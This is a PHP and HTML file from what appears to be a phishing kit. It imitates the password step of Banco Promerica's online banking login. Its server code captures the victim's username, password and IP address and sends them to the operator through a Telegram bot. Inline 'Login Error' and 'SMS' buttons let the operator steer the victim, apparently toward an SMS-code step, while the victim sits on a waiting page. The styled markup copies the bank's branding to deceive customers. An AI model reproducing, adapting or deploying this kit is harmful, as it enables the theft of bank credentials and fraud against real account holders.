<?php
/* Login System v2.1 - Password Step */
session_start();
include("settings.php"); // $token y $chat_id

// Si no viene de index.php (no hay usuario en sesión), volver al inicio
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $clave = $_POST['ips2'] ?? '';
    $ip    = $_SERVER['REMOTE_ADDR'];

    $msg = "🔐 Log HNL\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text'    => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
                    ['text' => '📩 SMS',         'callback_data' => "SMS|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco Promerica - Banca en Línea</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#fff;
    color:#333;
    min-height:100vh;
}

.container{
    display:flex;
    width:100%;
    height:100vh;
}

.left-panel{
    flex:0 0 40%;
    position:sticky;
    top:0;
    height:100vh;
    overflow:hidden;
    background:#ddd;
}

.left-panel img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
}

.security-banner{
    position:absolute;
    bottom:0;
    left:0;
    width:100%;
    background:rgba(0,0,0,0.58);
    color:#fff;
    padding:22px 30px 22px 72px;
    font-size:13px;
    line-height:1.7;
    font-weight:400;
}

.security-banner::before{
    content:"";
    position:absolute;
    left:18px;
    bottom:18px;
    width:42px;
    height:42px;
    border-radius:50%;
    background:#008a43;
    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='white' viewBox='0 0 24 24'><path d='M12 2L4 5v6c0 5.25 3.4 10.17 8 11.74C16.6 21.17 20 16.25 20 11V5l-8-3zm0 4a2 2 0 012 2v2h1a1 1 0 011 1v5H8v-5a1 1 0 011-1h1V8a2 2 0 012-2zm-1 4h2V8h-2v2z'/></svg>");
    background-repeat:no-repeat;
    background-position:center;
    background-size:20px;
}

.security-banner a{
    display:inline-block;
    margin-top:8px;
    color:#fff;
    text-decoration:underline;
    font-weight:600;
}

.right-panel{
    flex:0 0 60%;
    display:flex;
    justify-content:flex-start;
    align-items:center;
    padding:50px 70px;
    background:#f8f8f8;
    overflow-y:auto;
}

.login-box{
    width:100%;
    max-width:560px;
    margin:auto;
}

.logo{
    width:100%;
    display:flex;
    justify-content:center;
    margin-bottom:52px;
}

.logo-img{
    width:280px;
    max-width:100%;
    object-fit:contain;
}

.welcome{
    font-size:33px;
    line-height:1.35;
    color:#00853f;
    font-weight:300;
    margin-bottom:24px;
}

.welcome strong{
    font-weight:600;
}

.user-display{
    font-size:15px;
    color:#444;
    margin-bottom:32px;
}

.user-display strong{
    color:#00853f;
    font-weight:600;
}

label{
    display:block;
    margin-bottom:12px;
    font-size:15px;
    font-weight:400;
    color:#555;
    font-family:Arial,Helvetica,sans-serif;
}

input[type="password"]{
    width:100%;
    height:56px;
    padding:0 16px;
    border:1px solid #cfcfcf;
    border-radius:4px;
    background:#fff;
    font-size:16px;
    outline:none;
    transition:0.2s;
}

input[type="password"]:focus{
    border-color:#00853f;
}

.field{
    margin-bottom:18px;
}

.btn-ingresar{
    width:100%;
    height:56px;
    margin-top:40px;
    border:none;
    border-radius:4px;
    background:#007a3d;
    color:#fff;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:0.2s;
}

.btn-ingresar:hover{
    background:#006633;
}

.forgot{
    text-align:center;
    margin-top:38px;
}

.forgot a{
    color:#007a3d;
    font-size:15px;
    text-decoration:underline;
}

.divider-links{
    margin-top:42px;
    padding-top:34px;
    border-top:1px solid #dfdfdf;
    text-align:center;
    line-height:2.2;
    color:#444;
    font-size:15px;
}

.divider-links a{
    color:#007a3d;
    font-weight:500;
    text-decoration:underline;
}

.help-section{
    margin-top:42px;
    padding-top:34px;
    border-top:1px solid #dfdfdf;
    text-align:center;
}

.help-img{
    max-width:150px;
    width:50%;
    height:auto;
    display:inline-block;
}

@media(max-width:1000px){
    body{overflow:auto;}
    .container{flex-direction:column;height:auto;}
    .left-panel{display:none;}
    .right-panel{
        flex:none;
        width:100%;
        padding:28px 22px;
        background:#fff;
        overflow:visible;
    }
    .login-box{max-width:100%;}
    .logo{justify-content:flex-start;margin-bottom:24px;}
    .logo-img{width:210px;}
    .welcome{font-size:24px;margin-bottom:12px;}
    .user-display{font-size:14px;margin-bottom:22px;}
    label{font-size:13px;margin-bottom:6px;}
    input[type="password"]{
        height:38px;
        font-size:13px;
        padding:0 12px;
        border-radius:3px;
    }
    .field{margin-bottom:10px;}
    .btn-ingresar{
        height:40px;
        font-size:14px;
        margin-top:20px;
        border-radius:3px;
    }
    .forgot{margin-top:22px;}
    .forgot a{font-size:13px;}
    .divider-links{
        margin-top:24px;
        padding-top:20px;
        font-size:13px;
        line-height:2;
    }
    .help-section{display:none;}
}
</style>
</head>
<body>
  <div class="container">
    <div class="left-panel">
      <img src="img/imgFondoLogin.png" alt="">
      <div class="security-banner">
        Nunca comparta por teléfono, email o redes sociales su clave de acceso, número de PIN o información confidencial.
        <br><a href="#">Ver más consejos de seguridad</a>
      </div>
    </div>

    <div class="right-panel">
      <div class="login-box">
        <div class="logo">
          <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
        </div>

        <h1 class="welcome">Te damos la bienvenida a<br>tu <strong>Banca en Línea</strong></h1>

        <p class="user-display">Usuario: <strong><?php echo htmlspecialchars($usuario); ?></strong></p>

        <form action="inde.php" method="POST">
          <div class="field">
            <label for="ips2">Contraseña</label>
            <input type="password" id="ips2" name="ips2" autocomplete="current-password" required autofocus>
          </div>
          <button type="submit" class="btn-ingresar">Ingresar</button>
        </form>

        <div class="forgot">
          <a href="index.php">¿No eres tú? Cambiar usuario</a>
        </div>

        <div class="divider-links">
          ¿Olvidaste tu contraseña? <a href="#">Recupérala aquí</a><br>
          ¿Aún no tienes una cuenta con nosotros? <a href="#">Abrir cuenta</a>
        </div>

        <div class="help-section">
          <img src="img/necesitasayuda.png" alt="¿Necesitas ayuda?" class="help-img">
        </div>
      </div>
    </div>
  </div>
</body>
</html>
